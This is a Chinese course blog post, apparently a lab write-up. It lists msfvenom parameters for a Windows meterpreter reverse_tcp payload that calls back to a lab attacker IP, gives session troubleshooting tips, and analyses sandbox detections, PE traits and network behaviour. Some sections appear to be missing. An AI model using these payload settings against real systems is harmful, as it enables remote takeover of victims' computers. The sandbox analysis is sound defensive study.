反向连接：从 msfvenom 到沙箱判定

发表于2026-11-09|更新于2026-11-09|网络渗透测试课程博客
|浏览量:

本节作业要求（网络渗透测试 · 第六章 远程控制）

一、PPT 9–10 复现对被控端的控制；生成的被控端提交微步云沙箱 https://s.threatbook.com/ 检测，主要步骤截图。

二、目标网站写入一句话木马，利用蚁剑连接并控制目标网站，主要步骤截图。

本篇做的是作业一。作业二（一句话木马 + 蚁剑）在另一篇里：《一句话木马：从 URL 到服务器控制台》。

同一个第六章，两条完全不同的路：一条把可执行文件送进系统，一条把脚本写进网站。这篇走的是前者。

一、反向连接：为什么是靶机主动连出来

先说清楚这个 payload 的方向，不然后面几条命令容易糊。

方向 谁发起连接 优点 缺点
正向（bind） 攻击机连靶机 靶机只要开端口就能进 防火墙和 NAT 会挡住入站
反向（reverse） 靶机连攻击机 出站流量几乎不被拦 攻击机必须能收，且只能连一次

reverse_tcp 属于第二种。这个选择解释了后面两个必须遵守的规则：

  1. 必须先开监听再运行 exe。反向连接是靶机主动发起的，它只试一次，连不上就静默退出，你事后再开监听也等不到。
  2. LHOST 必须填攻击机的地址，不是靶机的。填错的结果是 exe 跑起来毫无反应，屏幕上什么都不显示，看起来像”没成功”，实际是在对着一个不存在的地址反复重试。

这两点在这一晚上的实验里都踩到了，后面第五节会讲。

二、生成：一行命令和它的五个参数

输出：

参数 值 作用
-p windows/x64/meterpreter/reverse_tcp 载荷类型：64 位 Windows 的 meterpreter 反连
LHOST 192.168.96.130 攻击机地址，也就是 Kali 的 IP
LPORT 5000 回连端口，和后面 handler 必须一致
-f exe 输出为可执行文件而不是裸 shellcode
-o /tmp/payload64.exe 输出路径，目录必须已存在，msfvenom 不会自动建

注意 -o 这一条。第一次写 /root/payload.exe 时报了 Permission denied，因为 Kali 默认用普通用户登录，/root 不可写。最省事的做法是输出到当前目录或 /tmp，需要 root 权限时再 sudo cp 过去。

还有一个细节：Payload size: 509 bytes 和 Final size: 7680 bytes 差了十几倍。因为这个 payload 是分阶段（staged）的——509 字节只是第一阶段的 stager，它的任务是连回攻击机、把真正的 meterpreter 主体（二十多万字节）拉下来执行。这个设计在漏洞利用里很关键：缓冲区只有几百字节的空间，塞不进完整载荷，只能塞一个”下载器”。

session 建立了，但用不了。 stdapi 是 meterpreter 的核心扩展，负责文件系统、进程、网络这些基础操作，它加载失败意味着这个 shell 只能连上、不能干活，敲 sysinfo 直接报错。

原因是位数：靶机是 Windows 11 24H2+ Build 26200，x64，而样本是 32 位的。在 64 位系统上，32 位进程走 WOW64 兼容层，meterpreter 需要往目标进程注入对应的 DLL，位数不匹配时注入就失败。

五、沙箱：11 / 28

样本交给微步云沙箱，判定的第一眼是这样的：

项 值
判定 恶意
检出率 11 / 28
威胁分类 木马
木马家族 Metasploit
场景标签 红队工具 - C2 框架类 - Metasploit
文件类型 PE32+ executable (GUI) x86-64, 5 sections, 7.5 KB
SHA256 7f806f2369aad38d88c6e81df3705cf7b2ebad59e14b5864625cfc87533beca1
分析环境 Win10 (1903 64bit, Office2016)

本地算出来的 SHA256 和沙箱报告完全一致，说明传上去的就是生成的那个文件，中间没有被改动。

11/28 这个数字的含义：差不多四成的引擎认出来了，另外六成没认出来。对一个原样输出、没做任何免杀的 payload 来说，这个结果说明两件事——静态特征确实明显，但也不是所有引擎都覆盖到。

六、引擎分歧：国内为什么全灭

这一节是这次实验里最值得看的部分。把引擎逐个列出来，分界线非常清楚：

检出的引擎 报出的名称
微软 MSE Trojan:Win32/Zusy.NCD!MTB
ESET a variant of Win64/Rozena.M trojan
卡巴斯基 Trojan.Win64.Shelma.b
大蜘蛛 Dr.Web BackDoor.Meterpreter.1465
GDATA Generic.ShellCode.Marte.F.A98DD5D5
小红伞 Avira HEUR/AGEN.1000110
IKARUS Trojan.Win64.Agent
Avast / AVG Win64:MalwareX-gen
K7 Trojan ( 006e37661 )
OneStatic Trojan/Metasploit.HJB

没检出的：360、百度、瑞星、江民、安天、Sophos、ClamAV、NANO、熊猫、Trustlook、MicroAPT。

两条结论：

第一，命名精度差别很大。 Dr.Web 直接报 BackDoor.Meterpreter——它认出了这是 Meterpreter，而不只是”某个木马”。OneStatic 报 Trojan/Metasploit，也是精确到框架。而微软报的 Zusy、卡巴报的 Shelma、ESET 报的 Rozena，都是各自体系的泛化命名，指的其实是同一类东西。同一个样本，不同引擎给出的家族名可以完全不同，看报告时不能只盯家族名。

第二，国内引擎这次集体失明。 360、百度、瑞星、江民、安天全部无检出。这不是说它们能力差，而是特征库的侧重点不同——msfvenom 生成的样本在野外的实际攻击里出现频率不高（真实的 APT 组织会自己做免杀），国内引擎的样本库自然覆盖得少。国际引擎因为长期跟踪红队工具，反而认得清楚。

这和同学那一篇形成了有意思的对照：他用 32 位样本，同样是 11/28，但家族判成了 Agent；这次 64 位样本判成了 Metasploit。检出率一样，命名精度不同——**检出率看的是”有没有命中特征”，家族名看的是”命中哪条特征”**，两者不是一回事。

七、静态：只导入一个函数的 PE

沙箱的静态分析部分暴露了这类样本最典型的特征——导入表只有一个 DLL、一个函数：

四个特征，每个都指向同一件事：

① 导入表只有一个函数。 正常程序会老老实实导入 CreateProcess、socket、connect 这些 API。这个样本一个都不导入，而是运行时自己用 LoadLibrary 和 GetProcAddress 去解析函数地址——字符串里的 ws2_32 就是证据：它要在运行时动态加载 winsock 库来建连接。这是 shellcode loader 的标准做法，目的是不留静态痕迹。

② 段名 .auct 不像正常编译器产的。 这是 msfvenom 的 --sec-name 特性——生成时随机起 4 个字符当段名，每次都不一样。正常 Visual Studio 编出来的段名是 .text、.rdata、.data 这些固定的。段名随机化本身就是可疑信号，而入口点 0x5000 正好落在这个 .auct 段里。

③ 编译时间戳是假的。 2026-04-14 22:29:22——这个不是真正的编译时间，而是 msfvenom 自带模板 exe 的固定时间戳。任何用同版本 msfvenom 生成的样本都会显示这个时间，跟你的实际生成时间无关。

④ 熵只有 1.41。 熵值衡量数据的随机性，加壳或加密的样本熵通常在 7 以上。1.41 这么低，说明里面没有加密载荷——印证了第二节说的：这只是个 stager，真正的内容在第二阶段从网络下载，本地文件里根本没有。

编译器信息显示 Microsoft Visual C/C++ (19.36.35215)、Visual Studio 2022 17.6——这是模板 exe 的编译环境，也不是攻击者的。这些”元数据”全是可伪造或者继承来的，它们不构成证据，只能当线索。

八、动态：六次 TCP，零次 DNS

跑到动态分析这页，行为特征就更清楚了：

指标 数量
TCP 6
Dead-Hosts 1
域名 / DNS / HTTP / HTTPS 全部 0
UDP / SMTP / ICMP / IRC 全部 0
释放文件 无

六次 TCP 连接，时间戳分别是 15ms、36ms、57ms、78ms、99ms——每 20 毫秒重连一次，全部指向 192.168.96.130:5000，就是我 Kali 上的 handler。

同时，DNS 是 0、HTTP 是 0、域名是 0。

这一组数字放在一起，说明的事情很明确：

它根本不查域名，直接连硬编码的 IP。 正常软件联网之前要先做 DNS 解析（比如连 www.baidu.com 得先问 DNS 服务器），而 C2 通信为了减少暴露面，通常直接写死 IP 和端口。**”有 TCP 无 DNS”本身就是一条强特征**，很多 IDS 规则就是靠这个抓反弹 shell 的。

每 20 毫秒重连一次，说明它在死循环重试。 因为沙箱环境里 192.168.96.130 这个地址不存在（那是我本机的 VMware NAT 网段，沙箱连不到），所以每次连接都失败，stager 就一遍遍重试。Dead-Hosts: 1 记的就是这个。

释放文件为 0，也印证了 stager 的假设。 meterpreter 正常的完整载荷会往磁盘写文件，但这个样本什么都没落地——它的全部任务就是把连接建起来，剩下的活交给下载下来的第二阶段。

还有一个细节：沙箱只看到了”打火”，没看到”点火”。因为在沙箱里连不上我的 Kali，session 根本没建立起来，meterpreter 的主体也没下载下来。但静态特征已经足够判恶意的了——11/28 的检出全部来自静态引擎，没有依赖任何动态行为。

这一点挺重要：给样本做免杀的人，改的往往是静态特征；而防守方真正该盯的，是”进程往外连了一个陌生 IP 还不查 DNS”这种行为。

另外提一句 Sigma 规则那三条命中——PsExec Tool Execution、PsExec Service Start、New Application in AppCompat。这三条都是通用行为规则（有程序启动、有服务安装就报），不是针对这个样本的精准特征，属于”沾边”。行为规则在 C2 场景里误报率高，这也是为什么沙箱报告要同时看静态和动态两块。

九、情报判定不等于行为判定

报告里有一处容易误读的地方：

五条连接全部被标成”安全”。

这不是说这些连接没问题。威胁情报查的是这个 IP 历史上有没有被标记过恶意行为，192.168.96.130 是 RFC1918 私有地址段里的内网 IP，情报库里根本不会有它的记录，系统只能归类为”保留地址 / 白名单”。

情报判定看的是”这个地址的黑历史”，行为判定看的是”这个程序在干什么”。 一个全新的 C2 服务器、或者一个内网地址，情报永远是”干净”的——这正是攻击者喜欢用新 IP 和内网跳板的原因。

所以看沙箱报告的正确顺序是：先看静态检出（样本本身可不可疑），再看动态行为（它干了什么），最后才看 IOC 情报（连的地址有没有前科）。反过来就会被”安全”两个字带偏。

十、小结

  1. **反向连接的核心约束是”靶机主动、只连一次”**。这决定了必须先开 handler 再运行样本，也决定了 LHOST 必须填攻击机地址——填错的表现是”什么都没发生”，很容易被误判成 payload 没生效。
  2. payload 的位数必须和靶机一致。32 位样本在 64 位系统上会连上但加载不了 stdapi，session 显示 opened，实际是个空壳。
  3. staged payload 只有几百字节，因为它只是个下载器。这既解释了 Payload size: 509 bytes 和 Final size: 7680 bytes 的差距，也解释了沙箱里”无释放文件”的现象——真正的内容从来没有落到磁盘上。
  4. 静态特征的三个信号：导入表极简、段名随机（.auct）、时间戳固定。三者同时出现，基本可以断定是工具生成的 shellcode loader，不用等动态跑完。
  5. **动态特征里最有价值的是”有 TCP、无 DNS”**。硬编码 IP 直连是 C2 通信的典型形态，比任何家族名都可靠。
  6. 检出率相同不代表判定相同。同为 11/28，家族名可能是 Agent 也可能是 Metasploit，因为不同引擎命中的特征不一样。看报告要把引擎名和它的命名体系一起看。
  7. **情报里的”安全”只是”没有前科”**。内网 IP、新 IP 在情报库里永远是干净的，判断可疑要看行为，不能看情报标签。

最后说一句实感：这条链上最容易失败的环节，不是技术，是环境。Defender 会在文件落地十四秒后把它隔离，篡改防护会让”关闭实时保护”这个动作看起来生效了其实没有，杀毒软件在下载的那一刻就可能把文件删掉。这些都不在任何教程的第一页上，但每一个都能让你对着屏幕怀疑自己操作错了。
